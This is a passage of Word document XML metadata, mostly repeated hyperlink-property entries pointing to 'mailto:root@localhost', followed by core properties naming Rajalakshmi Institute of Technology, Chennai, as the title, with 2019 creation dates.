      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>69</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>66</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>63</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>60</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>57</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>54</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>51</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>48</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>45</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>42</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>39</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>36</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>33</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>30</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>27</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>24</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>21</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>18</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>15</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>12</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>9</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>6</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>3</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:i4>2752605</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>mailto:root@localhost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RAJALAKSHMI INSTITUTE OF TECHNOLOGY, CHENNAI</dc:title>
  <dc:subject/>
  <dc:creator>RIT</dc:creator>
  <cp:keywords/>
  <cp:lastModifiedBy>harini murali</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <cp:lastPrinted>2011-03-01T09:20:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-09-25T03:09:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-09-25T03:09:00Z</dcterms:modified>
</cp:coreProperties>
</file>